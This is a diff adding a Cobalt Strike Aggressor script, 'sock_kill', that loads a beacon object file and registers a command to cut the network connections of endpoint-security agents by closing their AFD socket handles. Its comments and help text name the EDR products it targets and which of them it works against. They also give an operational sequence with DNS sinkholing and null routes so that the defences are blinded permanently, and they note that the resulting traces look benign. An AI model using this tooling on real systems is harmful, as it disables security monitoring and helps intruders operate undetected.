@@ -1,0 +1,107 @@
+# sock_kill.cna — Aggressor script for sock_kill BOF
+#
+# Terminate active EDR TCP connections by closing AFD socket handles
+# via NtDuplicateObject(DUPLICATE_CLOSE_SOURCE).
+#
+# This fills the gap that NRPT + null_route leave open:
+#   - NRPT/null_route prevent NEW connections  (persistent block)
+#   - sock_kill terminates EXISTING connections immediately (one-shot)
+#
+# Run sock_kill AFTER installing NRPT/null_route so:
+#   1. Active connections die via RST (sock_kill)
+#   2. Reconnect attempts fail (NRPT + null_route)
+#   → Complete EDR network blindness with no latency gap
+#
+# Mechanism:
+#   Socket handles are NT file objects at \Device\Afd.
+#   NtDuplicateObject(DUPLICATE_CLOSE_SOURCE) closes a remote handle.
+#   Closing the last handle to an AFD socket → OS sends TCP RST immediately.
+#   The EDR's send()/recv() calls return WSAECONNRESET.
+#
+# Requires: PROCESS_DUP_HANDLE access (admin, non-PPL target)
+# PPL processes: MDE (MsSense.exe), CrowdStrike → will fail — use NRPT+null_route
+#
+# Usage:
+#   sock_kill list MsSense.exe           list socket handles (no changes)
+#   sock_kill kill MsSense.exe           RST all connections in MsSense.exe
+#   sock_kill kill elastic-endpoint.exe  RST Elastic connections
+#   sock_kill kill MsSense.exe;csagent.exe   multiple targets
+
+alias sock_kill {
+    local('$bof $args $bid $handle $path $mode $target');
+    $bid  = $1;
+    $path = script_resource("sock_kill.x64.o");
+
+    $handle = openf($path);
+    if ($handle is $null) {
+        berror($bid, "[sock_kill] Cannot open BOF: " . $path);
+        return;
+    }
+    $bof = readb($handle, 1048576);
+    closef($handle);
+    if ($bof is $null) {
+        berror($bid, "[sock_kill] readb failed: " . $path);
+        return;
+    }
+    println("[sock_kill] loaded " . strlen($bof) . " bytes from " . $path);
+
+    if (size(@_) < 3) {
+        berror($bid, "[sock_kill] Usage:\n" .
+            "  sock_kill list <process.exe>   list socket handles (no changes)\n" .
+            "  sock_kill kill <process.exe>   close all sockets → TCP RST\n\n" .
+            "Multiple targets: sock_kill kill MsSense.exe;csagent.exe\n\n" .
+            "PPL note: MDE (MsSense.exe), CrowdStrike (csagent.exe) are PPL.\n" .
+            "          OpenProcess(PROCESS_DUP_HANDLE) will fail for PPL targets.\n" .
+            "          Use nrpt_sinkhole + null_route for PPL. sock_kill for non-PPL.");
+        return;
+    }
+
+    if ($2 eq "kill") {
+        $mode   = 1;
+        $target = $3;
+        btask($bid, "Sock Kill: RST all TCP connections in " . $target);
+    } else {
+        $mode   = 0;
+        $target = $3;
+        btask($bid, "Sock Kill: listing sockets in " . $target);
+    }
+
+    $args = bof_pack("iZ", $mode, $target);
+    beacon_inline_execute($bid, $bof, "go", $args);
+}
+
+beacon_command_register(
+    "sock_kill",
+    "Terminate EDR TCP connections by closing AFD socket handles via NtDuplicateObject",
+    "Usage:\n" .
+    "  sock_kill list <process>   enumerate AFD socket handles (read-only)\n" .
+    "  sock_kill kill <process>   close all AFD sockets → immediate TCP RST\n\n" .
+    "Examples:\n" .
+    "  sock_kill list MsSense.exe\n" .
+    "  sock_kill kill elastic-endpoint.exe\n" .
+    "  sock_kill kill SentinelAgent.exe;elastic-endpoint.exe\n\n" .
+    "Why this is novel:\n" .
+    "  Does not use: routing tables, DNS, WFP, firewall rules, or process memory writes.\n" .
+    "  Uses only NtDuplicateObject(DUPLICATE_CLOSE_SOURCE) — same technique as\n" .
+    "  handle theft, applied to socket (AFD) handles specifically.\n" .
+    "  Requires only PROCESS_DUP_HANDLE access — weaker than PROCESS_VM_WRITE.\n\n" .
+    "How it works:\n" .
+    "  1. NtQuerySystemInformation(SystemExtendedHandleInformation) — all system handles\n" .
+    "  2. Filter by target PID\n" .
+    "  3. For each handle: duplicate, NtQueryObject for name, check \\Device\\Afd prefix\n" .
+    "  4. On match: NtDuplicateObject(DUPLICATE_CLOSE_SOURCE) — close in target process\n" .
+    "  5. Closing last socket handle → afd.sys sends TCP RST immediately\n\n" .
+    "Operational sequence:\n" .
+    "  nrpt_sinkhole <edr-domains>   # prevent DNS reconnects\n" .
+    "  null_route <edr-ips>          # prevent IP reconnects\n" .
+    "  sock_kill kill <edr-process>  # terminate active connections NOW\n" .
+    "  → EDR is network-blind immediately, permanently\n\n" .
+    "PPL compatibility:\n" .
+    "  MDE (MsSense.exe)        PPL → PROCESS_DUP_HANDLE DENIED\n" .
+    "  CrowdStrike (csagent.exe) PPL → PROCESS_DUP_HANDLE DENIED\n" .
+    "  SentinelOne              Non-PPL → WORKS\n" .
+    "  Elastic                  Non-PPL → WORKS\n" .
+    "  Carbon Black             Non-PPL → WORKS\n\n" .
+    "Artifact: TCP RST in network capture (looks like a normal connection reset)\n" .
+    "No registry, no route table, no firewall changes — nothing persistent."
+);
